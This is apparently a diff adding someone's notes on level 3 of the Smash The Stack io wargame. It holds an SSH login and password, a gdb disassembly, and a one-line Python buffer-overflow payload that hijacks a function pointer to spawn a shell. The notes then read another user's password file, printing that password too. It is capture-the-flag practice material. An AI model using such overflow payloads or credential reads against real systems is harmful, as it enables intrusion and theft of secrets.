@@ -1,0 +1,80 @@
+ssh level3@io.smashthestack.org
+password: Ib3F7i7FqjziuDOBKi
+
+#####
+# Notes
+
+http://raidersec.blogspot.com/2012/10/smash-stack-io-level-3-writeup.html
+
+(gdb) r asdf
+Starting program: /levels/level03 asdf
+This is exciting we're going to 0x80484a4
+I'm so sorry, you're at 0x80484a4 and you want to be at 0x8048474
+
+(gdb) disass main
+Dump of assembler code for function main:
+   0x080484c8 <+0>:    push   %ebp
+   0x080484c9 <+1>:    mov    %esp,%ebp
+   0x080484cb <+3>:    sub    $0x78,%esp
+   0x080484ce <+6>:    and    $0xfffffff0,%esp
+   0x080484d1 <+9>:    mov    $0x0,%eax
+   0x080484d6 <+14>:   sub    %eax,%esp
+   0x080484d8 <+16>:   movl   $0x80484a4,-0xc(%ebp)
+   0x080484df <+23>:   cmpl   $0x2,0x8(%ebp)
+   0x080484e3 <+27>:   jne    0x80484fc <main+52>
+   0x080484e5 <+29>:   mov    0xc(%ebp),%eax
+   0x080484e8 <+32>:   add    $0x4,%eax
+   0x080484eb <+35>:   mov    (%eax),%eax
+   0x080484ed <+37>:   mov    %eax,(%esp)
+   0x080484f0 <+40>:   call   0x804839c <strlen@plt>
+   0x080484f5 <+45>:   cmp    $0x3,%eax
+   0x080484f8 <+48>:   jbe    0x80484fc <main+52>
+   0x080484fa <+50>:   jmp    0x8048505 <main+61>
+   0x080484fc <+52>:   movl   $0x0,-0x5c(%ebp)
+   0x08048503 <+59>:   jmp    0x8048579 <main+177>
+   0x08048505 <+61>:   mov    0xc(%ebp),%eax
+   0x08048508 <+64>:   add    $0x4,%eax
+   0x0804850b <+67>:   mov    (%eax),%eax
+   0x0804850d <+69>:   mov    %eax,(%esp)
+   0x08048510 <+72>:   call   0x804839c <strlen@plt>
+   0x08048515 <+77>:   mov    %eax,0x8(%esp)
+   0x08048519 <+81>:   mov    0xc(%ebp),%eax
+   0x0804851c <+84>:   add    $0x4,%eax
+---Type <return> to continue, or q <return> to quit---
+   0x0804851f <+87>:          mov    (%eax),%eax
+   0x08048521 <+89>:          mov    %eax,0x4(%esp)
+   0x08048525 <+93>:          lea    -0x58(%ebp),%eax
+   0x08048528 <+96>:          mov    %eax,(%esp)
+   0x0804852b <+99>:          call   0x804838c <memcpy@plt>
+   0x08048530 <+104>:         mov    0xc(%ebp),%eax
+   0x08048533 <+107>:         add    $0x4,%eax
+   0x08048536 <+110>:         mov    (%eax),%eax
+   0x08048538 <+112>:         mov    %eax,(%esp)
+   0x0804853b <+115>:         call   0x804839c <strlen@plt>
+   0x08048540 <+120>:         sub    $0x4,%eax
+   0x08048543 <+123>:         mov    %eax,0x8(%esp)
+   0x08048547 <+127>:         movl   $0x0,0x4(%esp)
+   0x0804854f <+135>:         lea    -0x58(%ebp),%eax
+   0x08048552 <+138>:         mov    %eax,(%esp)
+   0x08048555 <+141>:         call   0x804835c <memset@plt>
+   0x0804855a <+146>:         mov    -0xc(%ebp),%eax
+   0x0804855d <+149>:         mov    %eax,0x4(%esp)
+   0x08048561 <+153>:         movl   $0x80486c0,(%esp)
+   0x08048568 <+160>:         call   0x80483ac <printf@plt>
+   0x0804856d <+165>:         mov    -0xc(%ebp),%eax
+   0x08048570 <+168>:         call   *%eax
+   0x08048572 <+170>:         movl   $0x0,-0x5c(%ebp)
+   0x08048579 <+177>:         mov    -0x5c(%ebp),%eax
+   0x0804857c <+180>:         leave  
+   0x0804857d <+181>:         ret    
+End of assembler dump.
+
+#####
+# Exploit
+
+level3@io:/levels$ ./level03 $(python -c 'print "A"*76 +
+"\x74\x84\x04\x08"')  
+This is exciting we're going to 0x8048474
+Win.
+sh-4.2$ cat /home/level4/.pass
+9C4Jxjc3O3IjB7nXej
